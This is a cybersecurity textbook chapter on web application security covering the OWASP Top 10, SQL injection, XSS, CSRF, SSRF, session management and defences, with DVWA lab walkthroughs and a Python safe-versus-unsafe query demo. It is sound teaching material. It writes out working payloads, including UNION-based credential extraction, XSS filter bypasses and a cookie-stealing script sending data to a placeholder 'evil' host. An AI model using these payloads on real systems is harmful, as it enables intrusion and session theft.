# Chapter 10: Web Application Security

> "The web is the largest attack surface in history, and every website is a potential entry point."

---

## Learning Objectives

After completing this chapter, you will be able to:

1. Explain the OWASP Top 10 vulnerability categories and the risk each represents.
2. Identify and exploit SQL injection, XSS, and CSRF in a controlled lab environment.
3. Explain broken authentication, insecure direct object references, and security misconfigurations.
4. Describe how HTTPS, CSP, HSTS, and SameSite cookies mitigate web attacks.
5. Test for injection vulnerabilities using manual and automated techniques.
6. Explain server-side request forgery (SSRF) and its impact in cloud environments.
7. Describe the role of a Web Application Firewall and its limitations.
8. Apply secure coding principles to prevent injection, XSS, and broken auth.

## Key Terms

- **OWASP**: Open Web Application Security Project; produces the Top 10 vulnerability list.
- **SQL injection (SQLi)**: injecting SQL code via user input to manipulate a database query.
- **XSS**: Cross-Site Scripting; injecting malicious JavaScript into a page viewed by other users.
- **CSRF**: Cross-Site Request Forgery; tricking a browser into sending an authenticated request.
- **SSRF**: Server-Side Request Forgery; tricking a server into making requests on the attacker's behalf.
- **IDOR**: Insecure Direct Object Reference; accessing another user's data by changing a reference.
- **Broken auth**: failures in session management, credential storage, or MFA enforcement.
- **CSP**: Content Security Policy; HTTP header restricting sources of executable content.
- **HSTS**: HTTP Strict Transport Security; forces HTTPS-only connections.
- **WAF**: Web Application Firewall; filters malicious HTTP requests.
- **Prepared statement**: a parameterised query that separates data from SQL structure.
- **Same-origin policy**: browser policy restricting how documents from one origin access another.

---



<!--CH10HTTP-->
## How the Web Works: HTTP, Sessions, and the Same-Origin Policy

Web attacks all exploit the mechanics of HTTP, so we begin there. The web runs on **HTTP**, a stateless
request/response protocol (Chapter 3): a client sends a **request** (a method, a path, headers, and an optional
body) and the server returns a **response** (a status code, headers, and a body). The common **methods** are
GET (retrieve, parameters in the URL), POST (submit, parameters in the body), and PUT/DELETE/PATCH; the
**status codes** group into 2xx success, 3xx redirect, 4xx client error (401 unauthorized, 403 forbidden, 404
not found), and 5xx server error. **HTTPS** is this same protocol inside a TLS tunnel (Chapter 2), which is why
serving login forms over plain HTTP leaks credentials (Chapter 3).

Because HTTP is stateless, applications track a logged-in user with a **session**: the server issues a random
**session identifier** stored in a **cookie**, and the browser returns it on every subsequent request. The
security of the whole application therefore rests on that cookie, which is why cookies should be marked
`Secure` (HTTPS only), `HttpOnly` (hidden from JavaScript, limiting XSS theft), and `SameSite` (limiting CSRF).
Finally, browsers enforce the **same-origin policy (SOP)**: script from one origin (scheme + host + port)
cannot read responses from another, which is the fence that XSS breaks and that **CORS** selectively relaxes.
These three ideas, the request/response model, session cookies, and the same-origin policy, are the stage on
which every attack below plays out.


## The OWASP Top 10

The OWASP Top 10 {cite}`owasp_top10_2021` is the most widely cited reference for web application
security risk. The 2021 edition groups vulnerabilities into risk categories based on incidence,
exploitability, and impact. This chapter covers the most technically significant categories.

### Broken Access Control

Broken access control is the top risk in OWASP 2021, reflecting how frequently authorisation is
implemented incorrectly. The application authenticates the user but fails to verify whether that
user is authorised to perform a specific action or access a specific resource.

#### Insecure Direct Object References

IDOR occurs when a resource identifier in a URL or parameter can be modified to access another
user's data without authorisation. If `GET /invoice?id=1234` returns a user's invoice, changing
the parameter to `id=1235` should not return another user's invoice without verifying ownership.
Horizontal privilege escalation (accessing peer data) is the most common form; vertical privilege
escalation (accessing admin data) is the most severe.

#### Forced Browsing and Path Traversal

Forced browsing accesses pages or resources that are not linked from the application but are not
protected by access controls. Path traversal (`../../etc/passwd`) exploits insufficient sanitisation
of file-path inputs to read arbitrary files on the server. A well-structured application uses
canonical path validation and whitelists permitted directories.

---



<!--CH10OWASP-->
### The OWASP Top 10:2025

The **OWASP Top 10** is the industry's consensus list of the most critical web-application security risks,
refreshed every few years from data across millions of applications. The current edition is **2025**, and it
continues a shift in emphasis from individual coding bugs toward how software is designed, built, and operated.

1. **A01:2025 Broken Access Control** (still #1): users acting outside their intended permissions, including
   insecure direct object references (IDOR) and, now folded in, **server-side request forgery (SSRF)**.
2. **A02:2025 Security Misconfiguration** (up from #5): insecure defaults, verbose errors, open cloud storage,
   missing hardening.
3. **A03:2025 Software Supply Chain Failures** (new, expanding "Vulnerable and Outdated Components"):
   compromised dependencies, build tools, and CI/CD pipelines (Chapter 17).
4. **A04:2025 Cryptographic Failures** (down from #2): weak or missing encryption of data in transit and at
   rest (Chapter 2).
5. **A05:2025 Injection** (down from #3): SQL, command, LDAP, and cross-site scripting flaws where untrusted
   input is interpreted as code.
6. **A06:2025 Insecure Design**: flaws in the architecture itself, not fixable by better implementation alone.
7. **A07:2025 Authentication Failures**: weak credentials, broken session management, missing MFA.
8. **A08:2025 Software or Data Integrity Failures**: unverified updates and insecure deserialization.
9. **A09:2025 Security Logging and Alerting Failures**: inability to detect and respond to breaches (Chapter
   12).
10. **A10:2025 Mishandling of Exceptional Conditions** (new): improper error handling, failing open, and
    logic errors under abnormal conditions.

The sections that follow examine the highest-impact of these in depth, with hands-on practice on the
Damn Vulnerable Web Application (DVWA), and the chapter's defenses map back to this list.


## Injection Attacks

### SQL Injection in Depth

SQLi is caused by constructing SQL queries using string concatenation with user-supplied input.
The canonical fix is parameterised queries (prepared statements), which separate the SQL structure
from the data and make injection structurally impossible.

#### Error-Based SQLi

Error-based SQLi submits syntax that causes the database to return an error message containing
internal information (table names, column names, version strings). Many production applications
display database errors to users, providing free intelligence to attackers.

#### Union-Based SQLi

A UNION SELECT appended to the original query extracts data from other tables. The attacker first
determines the number of columns in the original query (by incrementing ORDER BY N until an error
occurs), then constructs a UNION SELECT with matching column count to extract target data.

#### Blind SQLi

Blind SQLi extracts data one bit at a time when the application provides no direct output. Boolean
blind: `AND 1=1 vs AND 1=2` produces different application responses, allowing inference. Time-based
blind: `AND SLEEP(5)` causes a five-second delay if the condition is true, extractable even when
the application shows identical pages for true and false.

### Cross-Site Scripting

XSS injects malicious JavaScript into content served to other users' browsers.

#### Reflected XSS

Reflected XSS occurs when user input is immediately echoed in the response without encoding. The
attacker crafts a URL containing a payload (`<script>document.location='https://evil/?' +
document.cookie</script>`) and sends it to a victim. The victim's browser executes the script in
the context of the trusted site, stealing the session cookie.

#### Stored XSS

Stored XSS persists the payload in the application's database (a comment, a username, a profile
field). Every user who views the infected page executes the script. Stored XSS is more dangerous
because it does not require the attacker to send a crafted link; the payload runs automatically.

#### DOM-Based XSS

DOM-based XSS occurs when client-side JavaScript writes attacker-controlled data to the DOM without
sanitisation. The payload never reaches the server; it is injected and executed entirely in the
browser. Classic sink functions: `innerHTML`, `eval()`, `document.write()`.

### Cross-Site Request Forgery

CSRF tricks an authenticated user's browser into sending a forged request to a target application.
Because the browser automatically includes session cookies, the forged request appears legitimate.
A hidden form on a malicious page that submits `POST /transfer?amount=1000&to=attacker` to the
banking site executes if the user is logged in and has no CSRF protection.

#### CSRF Mitigations

The primary mitigation is a synchroniser token: a secret value included in each form that the
server validates before processing the request. The SameSite cookie attribute (Strict or Lax)
prevents cookies from being sent with cross-origin requests, defeating CSRF for modern browsers.

### Server-Side Request Forgery

SSRF causes the server to make HTTP requests on behalf of the attacker. If an application fetches
a user-specified URL, an attacker can point it at `http://169.254.169.254/` (the AWS Instance
Metadata Service) to extract IAM credentials, or at internal services (`http://localhost:8080/admin`)
not accessible externally. SSRF is particularly severe in cloud environments where the metadata
service exposes credentials for the host machine's IAM role.

---



<!--CH10SQLI-->
## SQL Injection in Depth

SQL injection (SQLi) remains the archetypal injection flaw (A05): it occurs when user input is concatenated
into a SQL query so that input becomes *code*. If a login query is built as
`SELECT * FROM users WHERE name='$u' AND pass='$p'`, supplying the username `admin' --` comments out the
password check, and supplying `' OR '1'='1` makes the WHERE clause always true. SQLi comes in several flavors:

- **In-band / UNION-based**: the attacker uses `UNION SELECT` to append attacker-chosen columns to the result,
  reading arbitrary tables (`' UNION SELECT username, password FROM users -- `).
- **Error-based**: coaxing the database into error messages that leak data.
- **Blind boolean-based**: when no data or error is returned, the attacker asks true/false questions and infers
  answers from page differences (`' AND 1=1 -- ` versus `' AND 1=2 -- `).
- **Blind time-based**: inferring answers from deliberate delays (`' AND SLEEP(5) -- `).

The automated tool **sqlmap** systematizes all of these. The defense is unambiguous and complete:
**parameterized queries (prepared statements)** that send code and data on separate channels so input can never
be parsed as SQL, reinforced by least-privilege database accounts, input validation, and stored procedures.
String concatenation of untrusted input into a query is the root cause and must be eliminated, not filtered.


```{admonition} Hands-On Lab: SQL Injection on DVWA (with solution)
:class: tip
On the **Damn Vulnerable Web Application (DVWA)** in a local lab, set security to *low* and open the SQL
Injection page, which runs `SELECT first_name, last_name FROM users WHERE user_id = '$id'`.

- **Confirm the flaw:** enter `1' OR '1'='1` -> the page returns *every* user, proving the input breaks out of
  the quoted string.
- **Enumerate columns:** `1' ORDER BY 2 -- ` succeeds but `ORDER BY 3 -- ` errors, so the query returns two
  columns.
- **Extract credentials (UNION):** `1' UNION SELECT user, password FROM users -- ` returns each user's name and
  their **MD5 password hash**, which can then be cracked offline (Chapter 11).
- **Raise the difficulty:** at *medium*, DVWA uses `mysqli_real_escape_string` and a drop-down, but the `id`
  parameter is numeric and unquoted, so injection via the intercepted POST (using Burp/ZAP) still works with
  payloads like `1 UNION SELECT user,password FROM users -- ` (no quotes needed).

*Why it works and how to fix it:* the vulnerable code concatenates `$id` directly into the query; DVWA's
*impossible* level uses a **prepared statement** (`PDO` with bound parameters) plus an `is_numeric` check, which
defeats every payload above. Write up the exact payloads that worked at low and medium and explain why the
parameterized *impossible* version cannot be injected.
```


## Cross-Site Scripting (XSS)

Cross-site scripting injects attacker JavaScript into pages other users view, breaking the same-origin policy
to steal session cookies, perform actions as the victim, or deface content. There are three types:

- **Reflected XSS**: the malicious script is in the request (a URL parameter) and reflected straight back in
  the response, delivered by tricking the victim into clicking a crafted link.
- **Stored (persistent) XSS**: the script is saved on the server (a comment, profile, or message) and served
  to every visitor, the most damaging because it needs no per-victim lure.
- **DOM-based XSS**: the vulnerability is entirely client-side, where JavaScript writes untrusted input into
  the page (`innerHTML`) without encoding.

The defense is **context-aware output encoding** (HTML-encode untrusted data so `<script>` becomes harmless
text), plus input validation, a strong **Content Security Policy (CSP)** that blocks inline and third-party
script, and `HttpOnly` cookies so that even successful XSS cannot read the session cookie. Encoding on output,
not just filtering on input, is the reliable fix because the safe representation depends on where the data is
placed (HTML body, attribute, JavaScript, URL).


```{admonition} Hands-On Lab: Reflected and Stored XSS on DVWA (with solution)
:class: tip
On DVWA at *low* security:

- **Reflected:** the XSS (Reflected) page echoes the `name` parameter. Enter
  `<script>alert(document.cookie)</script>` -> the script executes and pops the cookie, proving arbitrary
  script runs in the victim's session. A real attacker would replace the alert with code that sends
  `document.cookie` to an attacker server.
- **Stored:** the XSS (Stored) guestbook saves your message. Submit
  `<script>alert('stored XSS')</script>` -> it fires for *everyone* who later views the page, demonstrating
  persistence.
- **Medium bypass:** at *medium*, DVWA strips `<script>` with a naive `str_replace`. Bypass it with a payload
  that does not contain that exact tag, for example an event handler,
  `<img src=x onerror=alert(document.cookie)>`, or case/nesting tricks such as `<SCRIPT>` or
  `<scr<script>ipt>` (which becomes `<script>` after the inner one is removed). This shows why **blacklist
  filtering fails**.

*Why it works and how to fix it:* the page inserts input into HTML without encoding. DVWA's *impossible* level
applies `htmlspecialchars()` (output encoding) so the payload renders as inert text. Record the payloads that
worked at low and the bypass at medium, and explain why output encoding plus a CSP defeats them while blacklist
filtering does not.
```


## Broken Access Control, CSRF, SSRF, and Other High-Impact Flaws

Beyond injection, several classes dominate real breaches. **Broken access control (A01)** is the failure to
enforce *what an authenticated user may do*. Its commonest form is the **insecure direct object reference
(IDOR)**: changing `/account?id=123` to `id=124` and seeing someone else's data because the server checks
authentication but not authorization. **Server-side request forgery (SSRF)**, now folded under A01, tricks the
*server* into making requests the attacker chooses (for example to internal-only addresses or a cloud
metadata endpoint), turning the server into a proxy past the firewall. Both are fixed by server-side
authorization checks on every object and by validating and allow-listing outbound request targets.

**Cross-site request forgery (CSRF)** abuses the fact that browsers auto-attach cookies: a malicious page makes
the victim's browser send an authenticated request (transfer money, change email) without the victim's intent.
The defenses are unpredictable **anti-CSRF tokens** tied to the session and `SameSite` cookies. Other recurring
flaws include **command injection** (untrusted input passed to a shell, fixed by avoiding shells and using
parameterized APIs), **insecure file upload** (uploading a web shell, fixed by validating type and storing
outside the web root), **XML external entity (XXE)** injection (fixed by disabling external entities), and
**insecure deserialization** (A08, fixed by avoiding native deserialization of untrusted data). The pattern
across all of them is the chapter's thesis: never trust input, enforce authorization server-side, and fail
securely.


## Authentication and Session Management

### Broken Authentication

Broken authentication encompasses: weak password policies, missing lockout after failed login
attempts (enabling brute force), credential stuffing (automating breach-database credentials
against the target), password reset flows that can be bypassed, and session tokens that are
too short or predictable.

#### Secure Password Storage

Passwords must never be stored in plaintext or as simple hashes. Use an adaptive algorithm
(bcrypt, Argon2id) with a sufficient cost factor. The National Institute of Standards and
Technology SP 800-63B recommends Argon2id as the preferred algorithm for new systems.

#### Session Management Best Practices

Session tokens must be generated with a cryptographically secure random number generator (CSPRNG),
be at least 128 bits of entropy, be invalidated on logout, have an absolute timeout, and be
transmitted only over HTTPS. The HttpOnly attribute prevents JavaScript access to session cookies;
the Secure attribute ensures they are sent only over TLS.

---



## Authentication, Sessions, and the Insufficient-Session-Expiration Flaw

Authentication and session-management failures (A07) are perennial. Beyond weak passwords and missing MFA
(Chapter 11), the *session* itself is a frequent weak point: session IDs must be long, random, regenerated on
login (to prevent **session fixation**), transmitted only over HTTPS, and **invalidated** on logout and after
inactivity. A specific, often-overlooked weakness is **insufficient session expiration**: when a session token
remains valid for too long, or is not destroyed on logout, a token captured or left on a shared computer keeps
working long after it should. The fix is short idle and absolute timeouts, server-side session invalidation on
logout (not merely deleting the client cookie), and rotating tokens on privilege changes. The lesson is that
authenticating a user once is not enough; the session that represents that authentication must be protected
throughout its lifetime, which is why session management appears explicitly in the OWASP Top 10.


## Security Misconfigurations

Security misconfiguration is the fifth-ranked OWASP risk and is extremely common. Examples:
default credentials left on administrative interfaces, unnecessary features enabled (debug mode,
unnecessary HTTP methods), verbose error messages exposing stack traces, directory listing enabled,
missing security headers (CSP, HSTS, X-Frame-Options).

### Security Headers

| Header | Purpose |
|---|---|
| Content-Security-Policy | Restrict sources of scripts, styles, and media |
| Strict-Transport-Security | Force HTTPS for the defined period |
| X-Frame-Options | Prevent clickjacking via iframe |
| X-Content-Type-Options: nosniff | Prevent MIME-type sniffing |
| Referrer-Policy | Control referrer header on cross-origin requests |
| Permissions-Policy | Restrict browser features (camera, mic, geolocation) |

---



## The Web-Application Testing Toolkit

Putting offense and defense together requires tooling, and a few tools are ubiquitous. **Burp Suite** and
**OWASP ZAP** are intercepting proxies that sit between browser and server so a tester can read, modify, and
replay every request, the core of manual web testing and of DAST (above); ZAP is free and open source.
**sqlmap** automates SQL injection discovery and exploitation; **nikto** scans for known server issues; and
**dirb/gobuster/feroxbuster** brute-force hidden paths (Chapter 8). For safe, legal practice, deliberately
vulnerable targets exist: **DVWA** (used in the labs above), **OWASP WebGoat** (a guided lessons app), and
**OWASP Juice Shop** (a modern single-page app). These let learners exploit every flaw in this chapter in an
environment they are authorized to attack, which is the only ethical way to build the skill.

```{admonition} Knowledge Check
:class: tip
1. Why does a parameterized query stop SQL injection where input filtering does not?
2. Distinguish reflected, stored, and DOM-based XSS, and name the cookie flag that limits cookie theft via XSS.
3. What is an IDOR, and what single control prevents it?

*Answers:* (1) A prepared statement sends the query structure and the data on separate channels, so user input
is always treated as a value and can never be parsed as SQL; filtering tries to enumerate bad input and is
routinely bypassed. (2) Reflected XSS is echoed from the request, stored XSS is saved server-side and served to
all viewers, DOM-based XSS is introduced entirely client-side; `HttpOnly` keeps JavaScript from reading the
session cookie. (3) An insecure direct object reference exposes another user's object by changing an
identifier; the fix is a server-side authorization check on every object access, not just authentication.
```


<!--APPSEC-->
## Application Security Testing: SAST, DAST, IAST, and DevSecOps

Finding the vulnerabilities of this chapter before attackers do is the job of **application security testing**,
and the methods differ by *when* and *how* they look. The two foundational, complementary techniques are SAST
and DAST.

- **Static Application Security Testing (SAST)** analyzes source code, bytecode, or binaries **at rest**, early
  in development, often inside the developer's IDE or as a commit/CI check. It walks the code (typically over an
  abstract syntax tree, using the **visitor pattern** described in Chapter 17) to flag insecure patterns. Its
  strength is pinpointing the exact vulnerable line before it ships; its weakness is that, lacking runtime
  context, it produces more false positives.
- **Dynamic Application Security Testing (DAST)** tests a **running** application from the outside in, like an
  ethical hacker, probing URLs, parameters, and APIs (OWASP ZAP, used in this book's labs, is a DAST tool). It
  runs later, on a staging or pre-production deployment. Its strength is confirming that a flaw is actually
  *exploitable* (fewer false positives); its weakness is that it cannot point to the offending line and needs a
  fully built, running app.

Two further methods fill the gap between them. **IAST (Interactive AST)** instruments the running application to
combine DAST-style execution with SAST-style code visibility, and **RASP (Runtime Application Self-Protection)**
embeds in the production app to detect and block attacks live. The professional consensus is not to choose but
to **layer** them in a **DevSecOps** pipeline: run SAST early so developers fix flaws as they type, then DAST
(and IAST) in staging to verify exploitability and catch runtime misconfigurations, then RASP and a WAF in
production. As the WAF section of this chapter notes, a **web application firewall** is the runtime gatekeeper
that filters SQL injection, cross-site scripting, and automated bot traffic, valuable, but a compensating
control that complements secure code rather than replacing the testing above.

```{admonition} Knowledge Check
:class: tip
1. What does SAST examine and when, versus DAST, and why does SAST tend to produce more false positives?
2. Why is "SAST or DAST" the wrong framing?
3. Which design pattern do static analyzers use to traverse a program's syntax tree, and where else does it
   appear in this book?

*Answers:* (1) SAST scans source/bytecode/binaries at rest early in development and lacks runtime context, so
it over-reports; DAST probes a running app from the outside later in the lifecycle and confirms exploitability.
(2) They cover different blind spots, code-level flaws versus runtime/exploitability, so a layered DevSecOps
approach uses both. (3) The visitor pattern (Chapter 17), which traverses the abstract syntax tree applying
checks at each node.
```


## Web Application Firewalls and Their Limits

A WAF inspects HTTP requests and blocks or logs those matching malicious patterns. It provides
a useful additional layer against known attack signatures and automated scanners, and can virtually
patch a vulnerable application while a permanent fix is being developed.

### WAF Bypass Techniques

WAFs can be bypassed via encoding tricks (double URL-encoding, Unicode variants), HTTP request
smuggling, case variation, and payload fragments that individually pass rules but combine to an
attack. A WAF is not a substitute for secure code; it is a compensating control for vulnerabilities
that cannot be immediately remediated.

---
- **SAST / DAST / IAST / RASP**: static, dynamic, interactive, and runtime application security testing/protection.
- **DevSecOps**: integrating security testing throughout the software development lifecycle.


## Why This Matters

Web applications are the primary attack surface for most organisations: they are internet-facing,
complex, written by many developers over years, and directly handle sensitive data. The OWASP Top 10
risks are found in the majority of applications tested; they are not rare edge cases. A developer
who understands injection, XSS, and broken auth and applies the corresponding fixes as a matter of
routine produces far fewer vulnerabilities than one who relies on scanners to catch what they missed.

---

## News in Focus

SQL injection vulnerabilities in web applications continue to produce major breaches despite being
one of the oldest and best-understood vulnerability classes. Several headline breaches of credit
card processors, retailers, and government agencies in the last decade were attributed to SQLi in
applications that were not using parameterised queries, despite the fix being well-documented since
the late 1990s. The persistence of this vulnerability class reflects the cost of not making secure
coding practices a hiring and review requirement.

---


In [ ]:
# Chapter 10 -- Safe SQLi demonstration with SQLite
import sqlite3, re

# ── Safe vs unsafe query comparison ────────────────────────────────────────────
conn = sqlite3.connect(":memory:")
cur = conn.cursor()
cur.executescript(
    "CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, role TEXT);"
    "INSERT INTO users VALUES (1,'alice','admin');"
    "INSERT INTO users VALUES (2,'bob','user');"
    "INSERT INTO users VALUES (3,'carol','user');"
)

def unsafe_login(username):
    # NEVER do this in real code
    query = f"SELECT * FROM users WHERE username = '{username}'"
    try:
        return cur.execute(query).fetchall()
    except Exception as e:
        return [f"DB ERROR: {e}"]

def safe_login(username):
    # Parameterised query: data can NEVER become code
    return cur.execute("SELECT * FROM users WHERE username = ?", (username,)).fetchall()

print("=== Safe vs Unsafe SQL Query Demo ===\n")
tests = [
    ("Normal input",        "alice"),
    ("SQLi bypass attempt", "' OR 1=1 --"),
    ("Union extraction",    "' UNION SELECT id,username,role FROM users --"),
]

for label, payload in tests:
    unsafe_result = unsafe_login(payload)
    safe_result   = safe_login(payload)
    print(f"  Input ({label}): {payload!r}")
    print(f"    Unsafe query returned : {unsafe_result}")
    print(f"    Safe query returned   : {safe_result}")
    print()

conn.close()

# ── XSS output encoding demo ──────────────────────────────────────────────────
import html

xss_payloads = [
    '<script>alert(1)</script>',
    '"><img src=x onerror=alert(1)>',
    "javascript:alert('xss')",
]

print("=== XSS Output Encoding Demo ===")
for p in xss_payloads:
    encoded = html.escape(p)
    print(f"  Raw    : {p}")
    print(f"  Encoded: {encoded}\n")


=== Safe vs Unsafe SQL Query Demo ===

  Input (Normal input): 'alice'
    Unsafe query returned : [(1, 'alice', 'admin')]
    Safe query returned   : [(1, 'alice', 'admin')]

  Input (SQLi bypass attempt): "' OR 1=1 --"
    Unsafe query returned : [(1, 'alice', 'admin'), (2, 'bob', 'user'), (3, 'carol', 'user')]
    Safe query returned   : []

  Input (Union extraction): "' UNION SELECT id,username,role FROM users --"
    Unsafe query returned : [(1, 'alice', 'admin'), (2, 'bob', 'user'), (3, 'carol', 'user')]
    Safe query returned   : []

=== XSS Output Encoding Demo ===
  Raw    : <script>alert(1)</script>
  Encoded: &lt;script&gt;alert(1)&lt;/script&gt;

  Raw    : "><img src=x onerror=alert(1)>
  Encoded: &quot;&gt;&lt;img src=x onerror=alert(1)&gt;

  Raw    : javascript:alert('xss')
  Encoded: javascript:alert(&#x27;xss&#x27;)



## Review Questions (MCQ)

**Q1.** The root cause of SQL injection is:
A. Using a database  B. Constructing queries by concatenating user-supplied strings  C. Using HTTP  D. Missing HTTPS

**Q2.** A parameterised query prevents SQLi because:
A. It encrypts the query  B. Data is sent separately from query structure and cannot become SQL code  C. It validates input length  D. It uses a stored procedure

**Q3.** Stored XSS is more dangerous than reflected XSS because:
A. It affects more browsers  B. It persists in the database and executes for every victim who views the page  C. It is harder to detect  D. It bypasses TLS

**Q4.** CSRF is mitigated by the SameSite=Strict cookie attribute because:
A. Cookies are encrypted  B. Cookies are not sent with cross-origin requests  C. The cookie expires immediately  D. The cookie is HttpOnly

**Q5.** SSRF in a cloud environment is particularly severe because:
A. It bypasses firewalls  B. The Instance Metadata Service exposes IAM credentials  C. It causes DDoS  D. It breaks TLS

**Q6.** IDOR vulnerabilities are in the OWASP category:
A. Cryptographic Failures  B. Broken Access Control  C. Injection  D. Security Misconfiguration

**Q7.** The Content-Security-Policy header primarily mitigates:
A. SQL injection  B. CSRF  C. XSS by restricting executable content sources  D. Session fixation

**Q8.** The HSTS header forces:
A. HTTP-only connections  B. HTTPS-only connections for the defined period  C. Encrypted cookies  D. SameSite cookies

**Q9.** A WAF is best described as:
A. A complete replacement for secure code  B. A compensating control that filters known attack patterns  C. A vulnerability scanner  D. An intrusion detection system

**Q10.** DOM-based XSS differs from reflected XSS in that the payload:
A. Requires a database  B. Never touches the server; injected and executed entirely in the browser  C. Is persistent  D. Only works in Internet Explorer

*Answers: Q1 B, Q2 B, Q3 B, Q4 B, Q5 B, Q6 B, Q7 C, Q8 B, Q9 B, Q10 B.*

## Lab Assignment

**Part A -- SQLi**: Using DVWA or SQLi-labs (locally), find and exploit at least two forms of SQL injection (error-based and blind). Document: the vulnerable parameter, the injection payload, the database version and at least one table name extracted.

**Part B -- XSS**: In DVWA, find and demonstrate reflected, stored, and DOM-based XSS. For each, document: the injection point, the payload, and the impact (what could an attacker do with this XSS).

**Part C -- Security headers audit**: Use `curl -I https://<any-public-site>` on three websites you are not targeting maliciously (large companies with public bug bounty programmes). Document which security headers are present and which are missing. Grade each site A-F.

**Part D -- CSRF protection analysis**: Inspect the login and account-update forms of a web application you own or are authorised to test. Identify whether CSRF tokens are present, whether they are validated server-side, and whether SameSite attributes are set on session cookies.

## References

```{bibliography}
:filter: docname in docnames
```

1. OWASP Foundation (2025). OWASP Top 10:2025. https://owasp.org/Top10/2025/
2. OWASP. Damn Vulnerable Web Application (DVWA); WebGoat; ZAP. https://owasp.org/
3. OWASP Cheat Sheet Series: SQL Injection Prevention, Cross-Site Scripting Prevention, Session Management.


```{index} OWASP, SQL injection, XSS, CSRF, SSRF, IDOR, Broken auth, CSP, HSTS, WAF, Prepared statement, Same-origin policy
```
